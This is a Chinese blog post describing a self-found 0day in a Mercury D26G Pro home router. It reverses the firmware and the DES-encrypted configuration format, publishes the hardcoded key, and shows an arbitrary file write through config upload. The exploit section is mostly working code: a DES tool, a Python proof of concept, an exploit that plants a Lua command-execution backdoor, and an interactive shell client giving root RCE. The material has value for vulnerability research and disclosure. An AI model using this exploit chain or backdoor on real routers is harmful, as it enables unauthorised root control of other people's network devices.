---
title: 如何日了宿舍路由器
tags:
  - iot
  - 0day
authors: [yoshino-s]
---

# 如何日了宿舍路由器

昨天晚上下游戏下得太慢了，所以想找点既不占网速又能搞一会的事，就想起来宿舍路由器还没玩过，不如日下路由器吧。

## 信息收集

咱宿舍路由器版本

![image-20220311100114440](https://cdn.yoshino-s.online//typora_img/image-20220311100114440.png)

固件版本 **1.0.6 Build 190829 Rel.45538n** ，去官网找一下对应版本固件号。

> 为什么不把路由器拆了读固件呢，因为我懒。。。想用纯软件手段日了。
>
> 后面发现其实连串口就能日但是还是因为我懒。。。

## 获得固件

官网下载喽

![image-20220311100346819](https://cdn.yoshino-s.online//typora_img/image-20220311100346819.png)

不知道我是V1还是V2但是先下一个版本类似的V1看看吧。

```bash
binwalk -e d26gprov1.bin
cd _d26gprov1.bin.extracted && ls
# 10400  10400.7z  177588.squashfs  37EC  37EC.7z  squashfs-root
#squashfs-root
#├── bin
#├── data
#├── dev
#├── etc
#├── etc_ro
#├── lib
#├── mnt
#├── overlay
#├── proc
#├── rom
#├── root
#├── sbin
#├── sys
#├── tmp
#├── usr
#├── var -> /tmp
#└── www
```

挺好的，就这样呗

## 固件分析

### 信息收集

先看看kernel版本

```bash
strings 10400 | grep Linux
# Linux version 3.10.14 (tplink@tplink-0B) (gcc version 4.6.3 20120201 (prerelease) (Linaro GCC 4.6-2012.02) ) #1 SMP Wed Nov 8 10:04:29 CST 2017
file squashfs-root/bin/busybox
# squashfs-root/bin/busybox: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, no section header
```

然后看看里面有啥

![image-20220311101054054](https://cdn.yoshino-s.online//typora_img/image-20220311101054054.png)

![image-20220311101112750](https://cdn.yoshino-s.online//typora_img/image-20220311101112750.png)

![image-20220311101207681](https://cdn.yoshino-s.online//typora_img/image-20220311101207681.png)

明显就是个openwrt定制版，看看版本没已知漏洞，只能自己挖了。cgi-bin有两个路由，但是实测访问不到，他用了另一套路由。

### 路由探索

这里就体现了真机的好处，直接去看他走的啥路由，就不用模拟了。（嘿嘿嘿，我好懒

![image-20220311101342823](https://cdn.yoshino-s.online//typora_img/image-20220311101342823.png)

然后就是找对应的controller然后找功能点，比如命令注入啥的。

简单分析一下就发现路由入口在`/usr/lib/lua/luci/controller/ds.lua`

```lua
function ds()
    local t = {}
    local l = require("luci.json")
    local r = require("luci.http.protocol")
    local n = d.jsondata()
    n = n or l.decode(d.get_raw_data() or "", r.urldecode) or {}
    if not n then
        t[e.NAME] = e.EINVFMT
        write_json(t)
        return
    end
    local r = n[KEY_METHOD]
    local l = {
        [METHOD_DO] = do_action,
        [METHOD_ADD] = set_data,
        [METHOD_DELETE] = set_data,
        [METHOD_MODIFY] = set_data,
        [METHOD_GET] = get_data
    }
    n[KEY_METHOD] = nil
    local l = l[r]
    if l then
        t = l(n, r)
    else
        t[e.NAME] = e.EINVINSTRUCT
    end
    write_json(t)
end
```

大概就是POST一个json，然后根据`method`字段选择对应的操作。注册操作在`/usr/lib/lua/luci/controller/admin/`目录下的文件里。先去看功能点吧。

### 好像找到了？

在`/usr/lib/lua/luci/controller/admin/weather.lua`里，有个很显然的命令注入。

![image-20220311102216819](https://cdn.yoshino-s.online//typora_img/image-20220311102216819.png)

但是后来发现怎么构造都访问不到，后来发现是因为版本问题，我手头路由器没有这个功能点。。。

但不管了，我们继续挖，然后发现其他地方要么做了过滤，要么压根不可控。但是功夫不负有心人，我发现了一个疑似的点。

### 什么傻逼算法

路由器有这么一个功能，导入导出配置

![image-20220311102515870](https://cdn.yoshino-s.online//typora_img/image-20220311102515870.png)

后台路由长这样

```lua
function download_conf()
    local n = require("luci.fs")
    local r = require("luci.torchlight.util")
    local t = {}
    local o = string.format("%s/%s", BACK_TMP_DIRPATH, CONF_TMP_NAME)
    if not r.merge_conf_list(l.CONFIG_DIR_PATHS, l.CONFIG_FILE_PATHS, l.EXCLUDE_FILE_PATHS, BACK_TMP_DIRPATH, o) then
        t[e.NAME] = e.EEXPT
        luci.http.prepare_content("application/json")
        luci.http.write_json(t)
        return
    end
    if not n.isfile(o) then
        t[e.NAME] = e.EEXPT
        luci.http.prepare_content("application/json")
        luci.http.write_json(t)
        return
    end
    luci.http.header('Content-Disposition', 'attachment; filename=' .. CONF_BIN_FILENAME)
    luci.http.prepare_content("application/octet-stream")
    local t = assert(io.open(o, "rb"))
    while true do
        local e = t:read(BUFSIZE)
        if e == nil then
            break
        end
        luci.http.write(e)
    end
    t:close()
    n.unlink(o)
end

function upload_conf()
    local c = require("luci.fs")
    local n = require("luci.torchlight.util")
    local i = require("luci.model.uci").cursor()
    local r = string.format("%s/%s", RES_TMP_DIRPATH, CONF_TMP_NAME)
    local o = string.format("%s/decrypt_conf", RES_TMP_DIRPATH)
    local o = {}
    o[e.NAME] = e.ENONE
    luci.http.prepare_content("text/html")
    if not c.mkdir(RES_TMP_DIRPATH, true) then
        o[e.NAME] = e.EEXPT
        luci.http.write_json(o)
        return
    end
    content_len = n.get_http_content_len()
    if content_len > l.MAX_CONF_FILE_SIZE then
        o[e.NAME] = e.EFILETOOBIG
        luci.http.write_json(o)
        luci.http.setfilehandler(function(e, e, e)
        end)
        luci.http.formvalue("filename")
        return
    end
    local l
    luci.http.setfilehandler(function(o, e, t)
        if not l then
            l = io.open(r, "w")
        end
        if e then
            l:write(e)
        end
        if t then
            l:close()
        end
    end)
    luci.http.formvalue("filename")
    local l, r = n.parse_conf(r, RES_TMP_DIRPATH)
    if not l then
        o[e.NAME] = r
        luci.http.write_json(o)
        return
    end
    i:commit_all()
    o[t.uciMoudleSpec.dynOptName.waitTime] = n.get_wait_time(t.uciMoudleSpec.optName.restore) or DEFAULT_RESTORE_TIME
    luci.http.write_json(o)
end
```

下载的配置文件是加密的，但没关系，源码都有了，逆一下不是问题。

我们可以发现他生成的时候是这样写的

```lua
r.merge_conf_list(l.CONFIG_DIR_PATHS, l.CONFIG_FILE_PATHS, l.EXCLUDE_FILE_PATHS, BACK_TMP_DIRPATH, o)
```

他似乎读了几个文件，然后合并进结果了。但是在解析的时候，却没有传这几个参数，直接parse了，那我们进行一个大胆的猜测，有任意文件写！

话不多说，我们先来日了他的配置生成和parse

这个方法全在`/usr/lib/lua/luci/torchlight/utils.lua`里，前面的我们不care，关键是先给他解密了再说

```lua
local d = l("luci.lib.des")
-- DES_KEY = "jklsd*%&%HDFG767" -- 在/usr/lib/lua/luci/torchlight/setting.lua
if o.ENONE ~= d.encrypt(t, a.DES_KEY, c) then 
    n.unlink(t)
    return false
end
```

加解密逻辑也挺简单的，就一个des，但是这个des很玄学，key传了个16位的，压根对不上，也没写模式和iv，还tm是的so。

![image-20220311103200862](https://cdn.yoshino-s.online//typora_img/image-20220311103200862.png)

怎么办，ida呗。

![image-20220311103420993](https://cdn.yoshino-s.online//typora_img/image-20220311103420993.png)

管他写了啥，直接找找开源实现，天下代码一大抄，我直接在github上找到了一模一样的实现，嘻嘻

![image-20220311103601385](https://cdn.yoshino-s.online//typora_img/image-20220311103601385.png)

那不管了，直接给他解一下呗

![image-20220311103657737](https://cdn.yoshino-s.online//typora_img/image-20220311103657737.png)

挺好看的哦，直接进行一个猜测，第一行就是剩下的内容md5加上版本签名。回去看看源码(`/usr/lib/lua/luci/torchlight/utils.lua#append_md5_header`)也确实这么写的。然后看一下他的parse，这里就不详细分析代码了，反正就是分离出来然后直接覆盖掉`FILE_PATH`位置上的文件。那不就成了！

## POC&EXP

这里我们构造一个POC

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>

int ByteToBit(char ch, char bit[8]);
int BitToByte(char bit[8], char *ch);
int Char8ToBit64(char ch[8], char bit[64]);
int Bit64ToChar8(char bit[64], char ch[8]);
int DES_MakeSubKeys(char key[64], char subKeys[16][48]);
int DES_PC1_Transform(char key[64], char tempbts[56]);
int DES_PC2_Transform(char key[56], char tempbts[48]);
int DES_ROL(char data[56], int time);
int DES_IP_Transform(char data[64]);
int DES_IP_1_Transform(char data[64]);
int DES_E_Transform(char data[48]);
int DES_P_Transform(char data[32]);
int DES_SBOX(char data[48]);
int DES_XOR(char R[48], char L[48], int count);
int DES_Swap(char left[32], char right[32]);

//初始置换表IP
int IP_Table[64] = {57, 49, 41, 33, 25, 17, 9, 1,
                    59, 51, 43, 35, 27, 19, 11, 3,
                    61, 53, 45, 37, 29, 21, 13, 5,
                    63, 55, 47, 39, 31, 23, 15, 7,
                    56, 48, 40, 32, 24, 16, 8, 0,
                    58, 50, 42, 34, 26, 18, 10, 2,
                    60, 52, 44, 36, 28, 20, 12, 4,
                    62, 54, 46, 38, 30, 22, 14, 6};
//逆初始置换表IP^-1
int IP_1_Table[64] = {39, 7, 47, 15, 55, 23, 63, 31,
                      38, 6, 46, 14, 54, 22, 62, 30,
                      37, 5, 45, 13, 53, 21, 61, 29,
                      36, 4, 44, 12, 52, 20, 60, 28,
                      35, 3, 43, 11, 51, 19, 59, 27,
                      34, 2, 42, 10, 50, 18, 58, 26,
                      33, 1, 41, 9, 49, 17, 57, 25,
                      32, 0, 40, 8, 48, 16, 56, 24};

//扩充置换表E
int E_Table[48] = {31, 0, 1, 2, 3, 4,
                   3, 4, 5, 6, 7, 8,
                   7, 8, 9, 10, 11, 12,
                   11, 12, 13, 14, 15, 16,
                   15, 16, 17, 18, 19, 20,
                   19, 20, 21, 22, 23, 24,
                   23, 24, 25, 26, 27, 28,
                   27, 28, 29, 30, 31, 0};

//置换函数P
int P_Table[32] = {15, 6, 19, 20, 28, 11, 27, 16,
                   0, 14, 22, 25, 4, 17, 30, 9,
                   1, 7, 23, 13, 31, 26, 2, 8,
                   18, 12, 29, 5, 21, 10, 3, 24};

// S盒
int S[8][4][16] = // S1
    {{{14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7},
      {0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8},
      {4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0},
      {15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13}},
     // S2
     {{15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10},
      {3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5},
      {0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15},
      {13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9}},
     // S3
     {{10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8},
      {13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1},
      {13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7},
      {1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12}},
     // S4
     {{7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15},
      {13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9},
      {10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4},
      {3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14}},
     // S5
     {{2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9},
      {14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6},
      {4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14},
      {11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3}},
     // S6
     {{12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11},
      {10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8},
      {9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6},
      {4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13}},
     // S7
     {{4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1},
      {13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6},
      {1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2},
      {6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12}},
     // S8
     {{13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7},
      {1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2},
      {7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8},
      {2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11}}};
//置换选择1
int PC_1[56] = {56, 48, 40, 32, 24, 16, 8,
                0, 57, 49, 41, 33, 25, 17,
                9, 1, 58, 50, 42, 34, 26,
                18, 10, 2, 59, 51, 43, 35,
                62, 54, 46, 38, 30, 22, 14,
                6, 61, 53, 45, 37, 29, 21,
                13, 5, 60, 52, 44, 36, 28,
                20, 12, 4, 27, 19, 11, 3};

//置换选择2
int PC_2[48] = {13, 16, 10, 23, 0, 4, 2, 27,
                14, 5, 20, 9, 22, 18, 11, 3,
                25, 7, 15, 6, 26, 19, 12, 1,
                40, 51, 30, 36, 46, 54, 29, 39,
                50, 44, 32, 46, 43, 48, 38, 55,
                33, 52, 45, 41, 49, 35, 28, 31};

//对左移次数的规定
int MOVE_TIMES[16] = {1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1};

//字节转换成二进制
int ByteToBit(char ch, char bit[8])
{
  int cnt;
  for (cnt = 0; cnt < 8; cnt++)
  {
    *(bit + cnt) = (ch >> cnt) & 1;
  }
  return 0;
}

//二进制转换成字节
int BitToByte(char bit[8], char *ch)
{
  int cnt;
  for (cnt = 0; cnt < 8; cnt++)
  {
    *ch |= *(bit + cnt) << cnt;
  }
  return 0;
}

//将长度为8的字符串转为二进制位串
int Char8ToBit64(char ch[8], char bit[64])
{
  int cnt;
  for (cnt = 0; cnt < 8; cnt++)
  {
    ByteToBit(*(ch + cnt), bit + (cnt << 3));
  }
  return 0;
}

//将二进制位串转为长度为8的字符串
int Bit64ToChar8(char bit[64], char ch[8])
{
  int cnt;
  memset(ch, 0, 8);
  for (cnt = 0; cnt < 8; cnt++)
  {
    BitToByte(bit + (cnt << 3), ch + cnt);
  }
  return 0;
}

//生成子密钥
int DES_MakeSubKeys(char key[64], char subKeys[16][48])
{
  char temp[56];
  int cnt;
  DES_PC1_Transform(key, temp); // PC1置换
  for (cnt = 0; cnt < 16; cnt++)
  {                                        // 16轮跌代，产生16个子密钥
    DES_ROL(temp, MOVE_TIMES[cnt]);        //循环左移
    DES_PC2_Transform(temp, subKeys[cnt]); // PC2置换，产生子密钥
  }
  return 0;
}

//密钥置换1
int DES_PC1_Transform(char key[64], char tempbts[56])
{
  int cnt;
  for (cnt = 0; cnt < 56; cnt++)
  {
    tempbts[cnt] = key[PC_1[cnt]];
  }
  return 0;
}

//密钥置换2
int DES_PC2_Transform(char key[56], char tempbts[48])
{
  int cnt;
  for (cnt = 0; cnt < 48; cnt++)
  {
    tempbts[cnt] = key[PC_2[cnt]];
  }
  return 0;
}

//循环左移
int DES_ROL(char data[56], int time)
{
  char temp[56];

  //保存将要循环移动到右边的位
  memcpy(temp, data, time);
  memcpy(temp + time, data + 28, time);

  //前28位移动
  memcpy(data, data + time, 28 - time);
  memcpy(data + 28 - time, temp, time);

  //后28位移动
  memcpy(data + 28, data + 28 + time, 28 - time);
  memcpy(data + 56 - time, temp + time, time);

  return 0;
}

// IP置换
int DES_IP_Transform(char data[64])
{
  int cnt;
  char temp[64];
  for (cnt = 0; cnt < 64; cnt++)
  {
    temp[cnt] = data[IP_Table[cnt]];
  }
  memcpy(data, temp, 64);
  return 0;
}

// IP逆置换
int DES_IP_1_Transform(char data[64])
{
  int cnt;
  char temp[64];
  for (cnt = 0; cnt < 64; cnt++)
  {
    temp[cnt] = data[IP_1_Table[cnt]];
  }
  memcpy(data, temp, 64);
  return 0;
}

//扩展置换
int DES_E_Transform(char data[48])
{
  int cnt;
  char temp[48];
  for (cnt = 0; cnt < 48; cnt++)
  {
    temp[cnt] = data[E_Table[cnt]];
  }
  memcpy(data, temp, 48);
  return 0;
}

// P置换
int DES_P_Transform(char data[32])
{
  int cnt;
  char temp[32];
  for (cnt = 0; cnt < 32; cnt++)
  {
    temp[cnt] = data[P_Table[cnt]];
  }
  memcpy(data, temp, 32);
  return 0;
}

//异或
int DES_XOR(char R[48], char L[48], int count)
{
  int cnt;
  for (cnt = 0; cnt < count; cnt++)
  {
    R[cnt] ^= L[cnt];
  }
  return 0;
}

// S盒置换
int DES_SBOX(char data[48])
{
  int cnt;
  int line, row, output;
  int cur1, cur2;
  for (cnt = 0; cnt < 8; cnt++)
  {
    cur1 = cnt * 6;
    cur2 = cnt << 2;

    //计算在S盒中的行与列
    line = (data[cur1] << 1) + data[cur1 + 5];
    row = (data[cur1 + 1] << 3) + (data[cur1 + 2] << 2) + (data[cur1 + 3] << 1) + data[cur1 + 4];
    output = S[cnt][line][row];

    //化为2进制
    data[cur2] = (output & 0X08) >> 3;
    data[cur2 + 1] = (output & 0X04) >> 2;
    data[cur2 + 2] = (output & 0X02) >> 1;
    data[cur2 + 3] = output & 0x01;
  }
  return 0;
}

//交换
int DES_Swap(char left[32], char right[32])
{
  char temp[32];
  memcpy(temp, left, 32);
  memcpy(left, right, 32);
  memcpy(right, temp, 32);
  return 0;
}

//加密单个分组
int DES_EncryptBlock(char plainBlock[8], char subKeys[16][48], char cipherBlock[8])
{
  char plainBits[64];
  char copyRight[48];
  int cnt;

  Char8ToBit64(plainBlock, plainBits);
  //初始置换（IP置换）
  DES_IP_Transform(plainBits);

  // 16轮迭代
  for (cnt = 0; cnt < 16; cnt++)
  {
    memcpy(copyRight, plainBits + 32, 32);
    //将右半部分进行扩展置换，从32位扩展到48位
    DES_E_Transform(copyRight);
    //将右半部分与子密钥进行异或操作
    DES_XOR(copyRight, subKeys[cnt], 48);
    //异或结果进入S盒，输出32位结果
    DES_SBOX(copyRight);
    // P置换
    DES_P_Transform(copyRight);
    //将明文左半部分与右半部分进行异或
    DES_XOR(plainBits, copyRight, 32);
    if (cnt != 15)
    {
      //最终完成左右部的交换
      DES_Swap(plainBits, plainBits + 32);
    }
  }
  //逆初始置换（IP^1置换）
  DES_IP_1_Transform(plainBits);
  Bit64ToChar8(plainBits, cipherBlock);
  return 0;
}

//解密单个分组
int DES_DecryptBlock(char cipherBlock[8], char subKeys[16][48], char plainBlock1[8])
{
  char cipherBits[64];
  char copyRight[48];
  int cnt;

  Char8ToBit64(cipherBlock, cipherBits);
  //初始置换（IP置换）
  DES_IP_Transform(cipherBits);

  // 16轮迭代
  for (cnt = 15; cnt >= 0; cnt--)
  {
    memcpy(copyRight, cipherBits + 32, 32);
    //将右半部分进行扩展置换，从32位扩展到48位
    DES_E_Transform(copyRight);
    //将右半部分与子密钥进行异或操作
    DES_XOR(copyRight, subKeys[cnt], 48);
    //异或结果进入S盒，输出32位结果
    DES_SBOX(copyRight);
    // P置换
    DES_P_Transform(copyRight);
    //将明文左半部分与右半部分进行异或
    DES_XOR(cipherBits, copyRight, 32);
    if (cnt != 0)
    {
      //最终完成左右部的交换
      DES_Swap(cipherBits, cipherBits + 32);
    }
  }
  //逆初始置换（IP^1置换）
  DES_IP_1_Transform(cipherBits);
  Bit64ToChar8(cipherBits, plainBlock1);
  return 0;
}

//加密文件
int DES_Encrypt(char *plainFile, char *keyStr, char *cipherFile)
{
  FILE *plain, *cipher;
  int count;
  char plainBlock[8], cipherBlock[8], keyBlock[8];
  char bKey[64];
  char subKeys[16][48];
  if ((plain = fopen(plainFile, "rb")) == NULL)
  {
    return 0;
  }
  if ((cipher = fopen(cipherFile, "wb")) == NULL)
  {
    return 0;
  }
  //设置密钥
  memcpy(keyBlock, keyStr, 8);
  //将密钥转换为二进制流
  Char8ToBit64(keyBlock, bKey);
  //生成子密钥
  DES_MakeSubKeys(bKey, subKeys);

  while (!feof(plain))
  {
    //每次读8个字节，并返回成功读取的字节数
    if ((count = fread(plainBlock, sizeof(char), 8, plain)) == 8)
    {
      DES_EncryptBlock(plainBlock, subKeys, cipherBlock);
      fwrite(cipherBlock, sizeof(char), 8, cipher);
    }
  }
  if (count)
  {
    //填充
    memset(plainBlock + count, '\0', 7 - count);
    //最后一个字符保存包括最后一个字符在内的所填充的字符数量
    plainBlock[7] = 8 - count;
    DES_EncryptBlock(plainBlock, subKeys, cipherBlock);
    fwrite(cipherBlock, sizeof(char), 8, cipher);
  }
  fclose(plain);
  fclose(cipher);
  return 0;
}

//解密文件
int DES_Decrypt(char *cipherFile, char *keyStr, char *plainFile)
{
  FILE *plain, *cipher;
  int count, times = 0;
  long fileLen;
  char plainBlock[8], cipherBlock[8], keyBlock[8];
  char bKey[64];
  char subKeys[16][48];
  if ((cipher = fopen(cipherFile, "rb")) == NULL)
  {
    return -1;
  }
  if ((plain = fopen(plainFile, "wb")) == NULL)
  {
    return -2;
  }

  //设置密钥
  memcpy(keyBlock, keyStr, 8);
  //将密钥转换为二进制流
  Char8ToBit64(keyBlock, bKey);
  //生成子密钥
  DES_MakeSubKeys(bKey, subKeys);

  //取文件长度
  fseek(cipher, 0, SEEK_END); //将文件指针置尾
  fileLen = ftell(cipher);    //取文件指针当前位置
  rewind(cipher);             //将文件指针重指向文件头
  while (1)
  {
    //密文的字节数一定是8的整数倍
    fread(cipherBlock, sizeof(char), 8, cipher);
    DES_DecryptBlock(cipherBlock, subKeys, plainBlock);
    times += 8;
    if (times < fileLen)
    {
      fwrite(plainBlock, sizeof(char), 8, plain);
    }
    else
    {
      break;
    }
  }
  //判断末尾是否被填充
  if (plainBlock[7] < 8)
  {
    for (count = 8 - plainBlock[7]; count < 7; count++)
    {
      if (plainBlock[count] != '\0')
      {
        break;
      }
    }
  }
  if (count == 7)
  { //有填充
    fwrite(plainBlock, sizeof(char), 8 - plainBlock[7], plain);
  }
  else
  { //无填充
    fwrite(plainBlock, sizeof(char), 8, plain);
  }

  fclose(plain);
  fclose(cipher);
  return 0;
}

int main(int argc, char** argv)
{
  if(argc != 5) {
    printf("Usage: ./des <encrypt|decrypt> <key> <file> <outfile>\n");
    return -1;
  }
  if(strcmp(argv[1], "encrypt") == 0) {
    DES_Encrypt(argv[3], argv[2], argv[4]);
  } else if(strcmp(argv[1], "decrypt") == 0) {
    DES_Decrypt(argv[3], argv[2], argv[4]);
  } else {
    printf("Usage: ./des <encrypt|decrypt> <key> <file> <outfile>\n");
    return -1;
  }
}
```

```python
import os
import requests
import hashlib
import random

stok = "8506481037c7b6f28fd834e1affad2b3"

url = "http://192.168.1.1"

u = f"{url}/stok={stok}/admin/system/upload_conf"

poc = random.randbytes(16).hex()

files = {
    "/www/web-static/poc": poc,
}

def gen():
    file = ""
    for name, content in files.items():
        file+="@FILE_START@------------------------------------------\n"
        file+="@FILE_PATH@="+name+"\n"
        file+=content+"\n"
        file+="@FILE_END@------------------------------------------\n"
    md5 = hashlib.md5(file.encode("utf-8")).hexdigest()
    file = md5 + ",D26G Pro 2.0\n"+file
    with open("config.txt", "w") as f:
        f.write(file)
    os.system('./test encrypt "jklsd*%&%HDFG767" config.txt config.bin && rm config.txt')
    with open("config.bin", "rb") as f:
        return f.read()

resp = requests.post(u, files={
    "file": ("config.bin", gen()),
}).json()

print(resp)

resp = requests.get(url + "/web-static/poc").text.strip()

if resp == poc:
    print("poc success")
else:
    print("poc fail", resp, poc)
```

![image-20220311104727490](https://cdn.yoshino-s.online//typora_img/image-20220311104727490.png)

成了，写cgi-bin没法+x执行不了，所以直接写rcS之类的，在这里我选择随便找个路由写个后门就完事了。exp如下

```python
import os
from time import sleep
import requests
import hashlib
import random

stok = "8506481037c7b6f28fd834e1affad2b3"

url = "http://192.168.1.1"

u = f"{url}/stok={stok}/admin/system/upload_conf"

poc = random.randbytes(16).hex()

files = {
    "/www/web-static/poc": poc,
    "/usr/lib/lua/luci/controller/admin/dmz.lua": """
local n = require("luci.torchlight.error")
module("luci.controller.admin.dmz", package.seeall)
function index()
    entry({"pc", "DMZCfg.htm"}, template("admin/DMZCfg")).leaf = true
    register_keyword_action("backdoor", "backdoor", "backdoor")
end
function backdoor(d)
    local e = {}
    if type(d) ~= "string" then
        return n.EINVARG
    end
    e["cmd"] = d
    local r = luci.sys.exec(d)
    e["result"] = r
    return n.ENONE, e
end
    """
}

def gen():
    file = ""
    for name, content in files.items():
        file+="@FILE_START@------------------------------------------\n"
        file+="@FILE_PATH@="+name+"\n"
        file+=content+"\n"
        file+="@FILE_END@------------------------------------------\n"
    md5 = hashlib.md5(file.encode("utf-8")).hexdigest()
    file = md5 + ",D26G Pro 2.0\n"+file
    with open("config.txt", "w") as f:
        f.write(file)
    os.system('./test encrypt "jklsd*%&%HDFG767" config.txt config.bin && rm config.txt')
    with open("config.bin", "rb") as f:
        return f.read()

resp = requests.post(u, files={
    "file": ("config.bin", gen()),
}).json()

print(resp)

resp = requests.get(url + "/web-static/poc").text.strip()

if resp == poc:
    print("poc success")
else:
    print("poc fail", resp, poc)
```

然后重启，然后访问一下看看

```python
from urllib.parse import unquote
import requests

stok = "49e7e9b0c6607228a6a68d8fb9271c95"

url = "http://192.168.1.1"

u = f"{url}/stok={stok}/admin/system/upload_conf"

while True:
    cmd = input("$ ")

    resp = unquote(requests.post(f"{url}/stok={stok}/ds", json={
        "backdoor": {"backdoor": cmd}, "method": "do"
    }).json()["result"]).replace("\\n", "\n")

    print(resp)

```

![image-20220311104922374](https://cdn.yoshino-s.online//typora_img/image-20220311104922374.png)

RCE了，root权限，剩下来的就随便玩玩啦。

> 经过分析D26G Pro V2也存在该漏洞，其他路由器暂未测试，怀疑均存在此类漏洞，有空看看吧

## 链接

固件下载 https://service.mercurycom.com.cn/download-search.html?kw=D26G&classtip=all
